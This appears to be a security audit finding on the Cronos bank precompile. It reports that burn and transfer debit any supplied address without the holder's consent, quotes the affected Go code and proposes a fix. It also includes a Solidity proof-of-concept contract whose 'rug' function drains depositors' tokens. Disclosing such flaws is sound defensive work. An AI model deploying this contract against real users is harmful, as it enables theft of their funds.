### Title
Bank Precompile `burn`/`transfer` Accept Arbitrary `from` Address Without Caller Authorization — Any Contract Can Drain Holders' `evm/<contract>` Native Tokens - (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The bank precompile (`0x0000000000000000000000000000000000000064`) exposes `burn(address, uint256)` and `transfer(address sender, address recipient, uint256 amount)` methods that operate on the denom `evm/<calling_contract_address>`. Neither method verifies that the address being debited has authorized the operation. Any EVM contract can therefore burn or transfer `evm/<itself>` native Cosmos tokens from any holder's account without that holder's consent.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles three mutating methods. For `burn`, the target address is taken verbatim from `args[0]`:

```go
recipient := args[0].(common.Address)          // line 121 – arbitrary caller-supplied address
...
addr := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())           // line 130 – denom scoped to calling contract
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)  // line 144
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)                           // line 147
```

For `transfer`, the source address is equally unconstrained:

```go
sender    := args[0].(common.Address)          // line 175 – arbitrary caller-supplied address
recipient := args[1].(common.Address)          // line 176
...
denom := EVMDenom(contract.Caller())           // line 186
...
bc.bankKeeper.SendCoins(ctx, from, to, ...)    // line 192
```

There is no check that `args[0]` equals `contract.Caller()`, `evm.Origin`, or any address that has granted an allowance. The only guard present is `checkBlockedAddr`, which only prevents sending *to* module accounts — it does not protect the *source* address.

The intended usage pattern (shown in `TestBank.sol`) is for the contract to pass `msg.sender` as the subject address, relying entirely on the contract's own Solidity logic to enforce authorization. The precompile itself imposes no such constraint.

---

### Impact Explanation

**Critical — Unauthorized burn/transfer of precompile-controlled assets.**

`evm/<contract_address>` tokens are native Cosmos SDK coins managed exclusively through the bank precompile. A malicious contract can:

1. Call `bank.burn(victimAddress, balance)` → destroys the victim's entire `evm/<attacker_contract>` native balance with no recourse.
2. Call `bank.transfer(victimAddress, attackerAddress, balance)` → moves the victim's `evm/<attacker_contract>` native balance to the attacker's Cosmos account, from which it can be withdrawn or bridged.

Both operations succeed silently as long as the victim holds a non-zero balance of the relevant denom. The Cosmos bank module enforces only that the source account has sufficient funds; it does not check consent.

---

### Likelihood Explanation

An unprivileged attacker needs only to:

1. Deploy a contract on Cronos (permissionless).
2. Induce users to hold `evm/<attacker_contract>` native tokens — achievable by advertising the contract as a legitimate DeFi protocol that calls `bank.mint(user, amount)` on deposit, issuing receipt tokens in the `evm/<contract>` denom.
3. At any later time, call `bank.burn(user, amount)` or `bank.transfer(user, attacker, amount)` from the same contract to drain all depositors.

No privileged keys, governance access, or cryptographic breaks are required. The attacker is a normal Cronos user who deploys a contract.

---

### Recommendation

Add an on-chain authorization check inside the precompile before debiting any address:

- For `burn`: require `recipient == contract.Caller()` (i.e., the contract may only burn tokens it holds itself, or tokens the holder has explicitly approved).
- For `transfer`: require `sender == contract.Caller()` **or** that an EVM-level allowance from `sender` to `contract.Caller()` covers the amount (mirroring the ERC-20 `transferFrom` model).

Alternatively, restrict `burn` and `transfer` so that the only debit-able address is `contract.Caller()` itself, forcing contracts to first pull tokens into their own account before burning or forwarding them.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Advertise this as a "deposit" function.
    // Victims call this; they receive evm/<this_contract> native tokens.
    function deposit(uint256 amount) external {
        // (attacker mints evm/<this> tokens to the caller as receipt)
        bank.mint(msg.sender, amount);
    }

    // Step 2: Attacker calls this at any time to drain all depositors.
    function rug(address victim, uint256 amount) external {
        // Burns victim's evm/<this_contract> tokens with no consent check
        bank.burn(victim, amount);
        // OR: silently transfer to attacker's address
        // bank.transfer(victim, address(this), amount);
    }
}
```

**Execution trace:**

1. Attacker deploys `AttackerContract` at `0xATK`.
2. Victim calls `deposit(100)` → `bank.mint(victim, 100)` → victim holds `100 evm/0xATK` native tokens on the Cosmos side.
3. Attacker calls `rug(victim, 100)` → `bank.burn(victim, 100)` executes at line 144 of `bank.go` → `SendCoinsFromAccountToModule(ctx, victim, "cronos", 100 evm/0xATK)` succeeds because the victim has the balance; coins are then burned at line 147.
4. Victim's `evm/0xATK` balance is zero; no approval was ever requested or checked. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L92-101)
```go
func (bc *BankContract) checkBlockedAddr(addr sdk.AccAddress) error {
	to, err := sdk.AccAddressFromBech32(addr.String())
	if err != nil {
		return err
	}
	if bc.bankKeeper.BlockedAddr(to) {
		return errorsmod.Wrapf(errortypes.ErrUnauthorized, "%s is not allowed to receive funds", to.String())
	}
	return nil
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
